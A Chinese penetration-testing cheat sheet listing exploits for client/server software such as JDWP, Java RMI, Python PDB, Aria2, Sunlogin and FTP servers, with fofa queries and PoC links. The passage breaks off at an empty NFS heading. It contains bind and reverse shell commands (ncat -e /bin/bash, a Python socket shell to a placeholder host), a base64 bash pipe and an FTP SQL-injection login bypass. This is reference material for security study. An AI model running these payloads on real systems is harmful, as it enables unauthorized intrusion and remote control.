# C/S - Exploits
---
## 免责声明
`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`
---
## 大纲
* **[运维](#运维)**
    * [Jmeter](#jmeter)
* **[编程语言](#编程语言)**
    * [Java](#java)
    * [Python](#python)
    * [Ruby](#ruby)
* **[远程服务](#远程服务)**
    * [Aria2](#aria2)
    * [Shadowsocks](#shadowsocks)
* **[文件服务](#文件服务)**
    * [FTP](#ftp)
    * [NFS](#nfs)
    * [Rsync](#rsync)
    * [Samba](#samba)
* **[数据库](#数据库)**
    * [CouchDB](#couchdb)
    * [InfluxDB](#influxdb)
    * [memcached](#memcached)
    * [MSSQL](#mssql)
    * [MongoDB](#mongodb)
    * [Mysql](#mysql)
    * [oracle](#oracle)
    * [OrientDB](#orientdb)
    * [PostgreSQL](#postgresql)
    * [Redis](#redis)
* **[容器 & 虚拟化](#容器--虚拟化)**
    * [Citrix](#citrix)
        * [Citrix Receiver](#citrix-receiver)
        * [XenMobile](#xenmobile)
    * [Docker](#docker)
        * [由系统漏洞引起](#由系统漏洞引起)
        * [由配置不当引起](#由配置不当引起)
        * [容器服务缺陷引起](#容器服务缺陷引起)
    * [Kubernetes](#kubernetes)
    * [VMware](#vmware)
        * [VMware vCenter](#vmware-vcenter)
        * [VMWare ESXi](#vmware-esxi)
        * [VMware View Planner](#vmware-view-planner)
        * [VMware vRealize Operations Manager](#vmware-vrealize-operations-manager)
        * [VMware Workspace ONE Access](#vmware-workspace-one-access)
* **[分布式](#分布式)**
    * [Hadoop](#hadoop)
    * [Spark](#spark)
    * [ZooKeeper](#zookeeper)
* **[组态软件](#组态软件)**
    * [WebAccess](#webaccess)
---
**资源**
- [theLSA/CS-checklist](https://github.com/theLSA/CS-checklist)
---
## 运维
### Jmeter
> fofa : title=="Apache JMeter Dashboard"
Apache JMeter 是美国阿帕奇（Apache）软件基金会的一套使用 Java 语言编写的用于压力测试和性能测试的开源软件。
**CVE-2018-1297 Jmeter RMI 反序列化命令执行漏洞**
- 描述
    Apache JMeter 2.x 版本和 3.x 版本中存在安全漏洞。攻击者可利用该漏洞获取 JMeterEngine 的访问权限并发送未授权的代码。
- POC | Payload | exp
    - https://vulhub.org/#/environments/jmeter/CVE-2018-1297/
---
## 编程语言
### Java
#### RMI
> Fofa: app="Oracle-JAVA-RMI"
> fofa: protocol="java-rmi"
**描述**
Java RMI, 即 远程方法调用(Remote Method Invocation), 一种用于实现远程过程调用(RPC)(Remote procedure call)的 Java API, 能直接传输序列化后的 Java 对象和分布式垃圾收集
通常开放在 1090 1099 等端口, 由于直接传输 java 对象, 可能存在远程代码执行.
**指纹**
- `rmiregistry`
**相关文章**
- [Java RMI 反序列化漏洞检测工具的编写](https://www.anquanke.com/post/id/85681)
- [JAVA反序列化之 Rmi命令执行漏洞分析](https://www.freebuf.com/column/200796.html)
- [JAVA RMI 反序列化远程命令执行漏洞](https://blog.csdn.net/LeeHDsniper/article/details/71599504)
**相关工具**
- [frohoff/ysoserial: A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.](https://github.com/frohoff/ysoserial)
- [A-D-Team/attackRmi](https://github.com/A-D-Team/attackRmi)
#### jdwp
**描述**
JDWP 是 Java Debug Wire Protocol 的缩写，在 JPDA（Java Platform Debugger Architecture）中，它定义了调试器（debugger）和被调试的 Java 虚拟机（target vm）之间的通信协议。
与 PHP 的 Xdebug 类似，当其调试端口直接开放在公网上时，很容易被攻击者攻击并且获取系统权限。
**指纹**
- `JDWP-Handshake`
    ```
    telnet 端口后，输入命令 JDWP-Handshake
    如果返回 JDWP-Handshake，证明存在漏洞。
    ```
    ```
    jdb -attach IP:PORT
    ```
**相关文章**
- [JDWP无依赖攻击](https://xz.aliyun.com/t/7303)
- [浅析常见Debug调试器的安全隐患](https://security.tencent.com/index.php/blog/msg/137)
- [jdwp远程调试与安全](https://qsli.github.io/2018/08/12/jdwp/)
- [jdwp命令执行](https://blog.csdn.net/caiqiiqi/article/details/83146415)
- [某大厂红队评估_之_JDWP打点](https://mp.weixin.qq.com/s/PPyXTdqWP1OAHYnYL9CScQ)
**相关工具**
- [IOActive/jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier)
    ```
    jdwp-shellifier.py -t xx.xx.xx.xx -p 8080 --break-on java.lang.String.indexOf --cmd 'touch /tmp/pwnd'
    jdwp-shellifier.py -t xx.xx.xx.xx -p 8080 --break-on java.lang.String.indexOf --cmd 'rm -f /var/run/yum.pid'
    jdwp-shellifier.py -t xx.xx.xx.xx -p 8080 --break-on java.lang.String.indexOf --cmd 'yum install -y nc'
    jdwp-shellifier.py -t xx.xx.xx.xx -p 8080 --break-on java.lang.String.indexOf --cmd 'ncat -v -l -p 7777 -e /bin/bash'
    jdwp-shellifier.py -t xx.xx.xx.xx -p 8000 --break-on java.lang.String.indexOf --cmd "bash -c {echo,  bash64的payload  } | {base64,-d} | {bash,-i}"
    ```
- [Lz1y/jdwp-shellifier](https://github.com/Lz1y/jdwp-shellifier) - 修改利用方式为通过对 Sleeping 的线程发送单步执行事件，达成断点，从而可以直接获取上下文、执行命令，而不用等待断点被击中。
#### jmx
**相关文章**
- [梦游一次从jmx到rce](https://y4er.com/posts/from-jmx-to-rce/)
---
### Python
**Python_PDB**
- 相关文章
    - [浅析常见Debug调试器的安全隐患](https://security.tencent.com/index.php/blog/msg/137)
    - [Python调试之RPDB工具](https://blog.woodcoding.com/python/2019/02/21/python-debug-tools-rpdb/)
- POC | Payload | exp
    ```
    telnet xxx.xxx.xxx.xxx 4444
    1
    w
    !1+1
    !import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx.xxx.xxx.xxx",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
    ```
**Python PIL 远程命令执行漏洞(GhostButt)**
- 描述
    Python 中处理图片的模块 PIL（Pillow），因为其内部调用了 GhostScript 而受到 GhostButt 漏洞（CVE-2017-8291）的影响，造成远程命令执行漏洞。
- 相关文章
    - [Exploiting Python PIL Module Command Execution Vulnerability](http://blog.neargle.com/2017/09/28/Exploiting-Python-PIL-Module-Command-Execution-Vulnerability/)
    - [GhostButt - CVE-2017-8291利用分析](https://paper.seebug.org/310/)
- POC | Payload | exp
    - [Python PIL 远程命令执行漏洞（GhostButt）](https://vulhub.org/#/environments/python/PIL-CVE-2017-8291/) - (未复现成功)
    - [vulhub/python/PIL-CVE-2017-8291/poc.png](https://github.com/vulhub/vulhub/blob/master/python/PIL-CVE-2017-8291/poc.png)
**Python PIL/Pillow Remote Shell Command Execution via Ghostscript CVE-2018-16509**
- 描述
     Google Project Zero 的 Tavis Ormandy 在 Ghostscript 中发现了一堆漏洞,其中一个是 CVE-2018-16509，这个漏洞允许利用 v9.24 之前的 Ghostscript 中的 -dSAFER 旁路，通过处理 PostScript 中失败的还原（grestore）来禁用 LockSafetyParams 并避免无效访问，从而执行任意命令。此漏洞可通过库，如 ImageMagick 或带有 Ghotscript 包装器的编程语言中的图像库（本例中的 PIL/Pillow）实现。
- POC | Payload | exp
    - [Python PIL/Pillow Remote Shell Command Execution via Ghostscript CVE-2018-16509](https://vulhub.org/#/environments/python/PIL-CVE-2018-16509/) - (未复现成功)
**Python unpickle 造成任意命令执行漏洞**
- 相关文章
    - [Django 远程命令执行漏洞详解](http://rickgray.me/2015/09/12/django-command-execution-analysis/)
    - [掌阅iReader某站Python漏洞挖掘](https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html)
- POC | Payload | exp
    - [Python unpickle 造成任意命令执行漏洞](https://vulhub.org/#/environments/python/unpickle/)
---
### ruby
> fofa : app="Ruby"
**ruby-debug-ide**
- 相关文章
    - [浅析常见Debug调试器的安全隐患](https://security.tencent.com/index.php/blog/msg/137)
---
## 远程服务
### Aria2
> 项目地址 : https://github.com/aria2/aria2
> fofa : "Aria2"
**Aria2 任意文件写入漏洞**
- 描述
    Aria2 是一个命令行下轻量级、多协议、多来源的下载工具 (支持 HTTP/HTTPS、FTP、BitTorrent、Metalink) ,内建 XML-RPC 和 JSON-RPC 接口.在有权限的情况下,我们可以使用 RPC 接口来操作 aria2 来下载文件,将文件下载至任意目录,造成一个任意文件写入漏洞.
- 相关文章
    - [Aria2 任意文件写入漏洞](https://github.com/vulhub/vulhub/blob/master/aria2/rce/README.zh-cn.md)
---
### Shadowsocks
**对 Shadowsocks stream ciphers 的重定向攻击**
- https://github.com/edwardz246003/shadowsocks
### clash_for_windows
**rce**
- https://github.com/Fndroid/clash_for_windows_pkg/issues/2710
### 向日葵
**相关文章**
- [绕过向日葵安装交互](https://www.t00ls.com/articles-67519.html)
**向日葵 rce**
- POC | Payload | exp
    - [Mr-xn/sunlogin_rce](https://github.com/Mr-xn/sunlogin_rce)
**CNVD-2022-10270 本地权限提升**
- POC | Payload | exp
    - [Ryze-T/CNVD-2022-10270-LPE](https://github.com/Ryze-T/CNVD-2022-10270-LPE)
### Dameware Mini Remote Control
> https://www.solarwinds.com/dameware-mini-remote-control
**CVE-2019-3980**
- 描述
    Dameware Mini Remote Client代理默认支持智能卡鉴权。这允许用户在运行SolarWinds Dameware Remote Mini Remote Client Agent Service（DWRCS.exe）的主机上上传可执行文件。
- 相关文章
    - [DAMEWARE MINI: THE SLEEPER HIT OF 2019?](https://www.trustedsec.com/blog/dameware-mini-the-sleeper-hit-of-2019/)
- POC | Payload | exp
    - https://github.com/tenable/poc/tree/master/Solarwinds/Dameware
---
## 文件服务
### FTP
**相关文章**
- [云服务器ftp被动和主动模式都连接失败](https://mp.weixin.qq.com/s/ogy7RuJpfABpdf4CHc3imA)
**Xlight FTP Server < 3.2.1 user 参数 SQL 注入漏洞**
- 描述
    在执行 ODBC 认证过程中 Xlight FTP Server 没有正确地过滤用户所提交的用户名和口令字段,远程攻击者可以用"OR ‘1’=’1’ ;#"替换用户名绕过认证登录到服务器.
- POC | Payload | exp
    ```bash
    220 Xlight FTP Server 3.2 ready...
    User (server-4:(none)) : \' OR \'1\'=\'1\' ;#
    331 Password required for \' OR \'1\'=\'1\' ;#
    Password : type anything
    230 Login OK
    ftp&gt;
    ```
**Serv-U FTP Server 目录遍历漏洞**
- 相关文章
    - [Serv-U FTP Server 0day漏洞分析报告](http://safe.it168.com/a2011/1213/1287/000001287577.shtml)
- POC | Payload | exp
    ```bash
    ls ../windwos
        550 .....
    ls ..:/windows
        150 ....
        ...
        ...
    ```
### NFS